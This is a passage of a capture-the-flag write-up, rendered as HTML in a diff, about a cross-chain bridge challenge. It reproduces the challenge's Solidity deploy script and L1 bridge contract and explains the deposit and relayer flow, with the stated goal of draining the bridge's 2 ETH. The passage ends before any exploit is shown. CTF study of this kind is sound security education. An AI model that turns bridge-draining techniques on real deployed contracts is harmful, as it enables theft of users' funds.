+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;src/L1/WETH.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;src/L1/L1CrossDomainMessenger.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;src/L1/L1ERC20Bridge.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;src/Challenge.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Lib_PredeployAddresses</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;src/libraries/constants/Lib_PredeployAddresses.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Deploy</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">system</span> <span class="o">=</span> <span class="n">getAddress</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">challenge</span> <span class="o">=</span> <span class="n">deploy</span><span class="p">(</span><span class="n">system</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">writeFile</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envOr</span><span class="p">(</span><span class="s">&#34;OUTPUT_FILE&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="s">&#34;/tmp/deploy.txt&#34;</span><span class="p">)),</span> <span class="n">vm</span><span class="p">.</span><span class="n">toString</span><span class="p">(</span><span class="n">challenge</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">deploy</span><span class="p">(</span><span class="kt">address</span> <span class="n">system</span><span class="p">)</span> <span class="k">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">challenge</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envString</span><span class="p">(</span><span class="s">&#34;L1_RPC&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">system</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">relayer</span> <span class="o">=</span> <span class="n">getAdditionalAddress</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">L1CrossDomainMessenger</span> <span class="n">l1messenger</span> <span class="o">=</span> <span class="k">new</span> <span class="n">L1CrossDomainMessenger</span><span class="p">(</span><span class="n">relayer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WETH</span> <span class="n">weth</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WETH</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">L1ERC20Bridge</span> <span class="n">l1Bridge</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">            <span class="k">new</span> <span class="n">L1ERC20Bridge</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">l1messenger</span><span class="p">),</span> <span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_ERC20_BRIDGE</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">weth</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">weth</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">l1Bridge</span><span class="p">),</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l1Bridge</span><span class="p">.</span><span class="n">depositERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">),</span> <span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_WETH</span><span class="p">,</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">challenge</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">Challenge</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">l1Bridge</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">l1messenger</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getAdditionalAddress</span><span class="p">(</span><span class="kt">uint32</span> <span class="n">index</span><span class="p">)</span> <span class="k">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">getAddress</span><span class="p">(</span><span class="n">index</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getPrivateKey</span><span class="p">(</span><span class="kt">uint32</span> <span class="n">index</span><span class="p">)</span> <span class="k">private</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="k">memory</span> <span class="n">mnemonic</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">            <span class="n">vm</span><span class="p">.</span><span class="n">envOr</span><span class="p">(</span><span class="s">&#34;MNEMONIC&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="s">&#34;test test test test test test test test test test test junk&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">vm</span><span class="p">.</span><span class="n">deriveKey</span><span class="p">(</span><span class="n">mnemonic</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getAddress</span><span class="p">(</span><span class="kt">uint32</span> <span class="n">index</span><span class="p">)</span> <span class="k">private</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">vm</span><span class="p">.</span><span class="n">addr</span><span class="p">(</span><span class="n">getPrivateKey</span><span class="p">(</span><span class="n">index</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon closely examining the <code>Deploy.s.sol</code> file, it&rsquo;s revealed that <code>Challenge.sol</code> is deployed on the <code>L1</code> chain. Furthermore, as part of its setup, it deposits <code>2 ETH</code> into the <code>L1</code> bridge. This means our primary objective is to drain the <code>bridge</code> contract on <code>L1</code>. To provide more context on the bridge&rsquo;s implementation, essentially, each chain has its own <code>bridge</code> contract. There&rsquo;s also an <code>off-chain</code> relayer (<code>relayer.py</code>). This relayer typically processes bridge requests and relays messages between the bridges on each chain.</p>
+<p>For your information, <code>off-chain</code> refers to activities or processes that take place outside of the blockchain network. The necessity for off-chain mechanisms in this scenario arises because contracts on different chains cannot directly interact with each other. In the context of blockchain technology, each chain operates in its own isolated environment. This isolation means that a contract on one chain cannot natively see, access, or trigger functions in a contract on another chain. To bridge this gap, off-chain relayers are employed. These relayers monitor events on one chain and then execute corresponding actions on another, effectively enabling communication and interaction between the two distinct blockchain networks.</p>
+<p>Now, as mentioned before that the <code>challenge.py</code> try to setup the <code>L1</code> and <code>L2</code> chain by deploying some contracts. Let&rsquo;s take a look on each of it one-by-one.</p>
+<p><strong>L1ERC20Bridge.sol</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IL1ERC20Bridge</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./IL1ERC20Bridge.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IL2ERC20Bridge</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../L2/IL2ERC20Bridge.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">CrossDomainEnabled</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/bridge/CrossDomainEnabled.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Lib_PredeployAddresses</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/constants/Lib_PredeployAddresses.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">SafeERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @title L1ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @dev The L1 ERC20 Bridge is a contract which stores deposited L1 funds and standard
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * tokens that are in use on L2. It synchronizes a corresponding L2 Bridge, informing it of deposits
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * and listening to it for newly finalized withdrawals.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> *
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">L1ERC20Bridge</span> <span class="k">is</span> <span class="n">IL1ERC20Bridge</span><span class="p">,</span> <span class="n">CrossDomainEnabled</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">SafeERC20</span> <span class="k">for</span> <span class="n">IERC20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">l2TokenBridge</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">weth</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Maps L1 token to L2 token to balance of the L1 token deposited
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">))</span> <span class="k">public</span> <span class="n">deposits</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1messenger</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2TokenBridge</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_weth</span><span class="p">)</span> <span class="n">CrossDomainEnabled</span><span class="p">(</span><span class="n">_l1messenger</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l2TokenBridge</span> <span class="o">=</span> <span class="n">_l2TokenBridge</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">weth</span> <span class="o">=</span> <span class="n">_weth</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @inheritdoc IL1ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">depositERC20</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">virtual</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_initiateERC20Deposit</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @inheritdoc IL1ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">depositERC20To</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">virtual</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_initiateERC20Deposit</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_initiateERC20Deposit</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">internal</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">).</span><span class="n">safeTransferFrom</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">message</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_l1Token</span> <span class="o">==</span> <span class="n">weth</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">IL2ERC20Bridge</span><span class="p">.</span><span class="n">finalizeDeposit</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_WETH</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">IL2ERC20Bridge</span><span class="p">.</span><span class="n">finalizeDeposit</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">sendCrossDomainMessage</span><span class="p">(</span><span class="n">l2TokenBridge</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">=</span> <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">+</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">ERC20DepositInitiated</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @inheritdoc IL1ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">finalizeERC20Withdrawal</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span>
+</span></span><span class="line"><span class="cl">        <span class="n">onlyFromCrossDomainAccount</span><span class="p">(</span><span class="n">l2TokenBridge</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">=</span> <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">-</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">).</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">ERC20WithdrawalFinalized</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @inheritdoc IL1ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">finalizeWethWithdrawal</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">external</span>
+</span></span><span class="line"><span class="cl">        <span class="n">onlyFromCrossDomainAccount</span><span class="p">(</span><span class="n">l2TokenBridge</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">finalizeERC20Withdrawal</span><span class="p">(</span><span class="n">weth</span><span class="p">,</span> <span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_WETH</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The contract we are looking at is the <code>bridge</code> contract for the <code>L1</code> chain. Analyzing the functions it offers, our primary action seems to be the <code>deposit</code> function. The key parameters for this function are the address of the token on the <code>L1</code> chain, the address of the corresponding token on the <code>L2</code> chain, and the deposit amount. We can break down the <code>deposit</code> function into four main actions:</p>
+<ol>
+<li>It transfers the specified <code>amount</code> of <code>_l1Token</code> from the sender to the contract itself.</li>
+<li>It encodes a message to be sent to the other chain, which in this case is <code>L2</code>. This message is essentially the encoded version of a call to the <code>finalizeDeposit</code> function (which we can deduce that available in the <code>bridge</code> contract of <code>L2</code>).</li>
+<li>It sends this encoded message by triggering the <code>sendCrossDomainMessage</code> function. We will explore this function in more detail shortly.</li>
+<li>It updates the <code>deposits[_l1Token][_l2Token]</code> record with the amount that has just been deposited.</li>
+</ol>
+<p>These steps provide a foundational understanding of how the <code>deposit</code> function operates within the <code>bridge</code> contract on the <code>L1</code> chain. Now, let&rsquo;s delve into the workings of the <code>sendCrossDomainMessage</code> function.</p>
+<p><strong>CrossDomainEnabled.sol</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
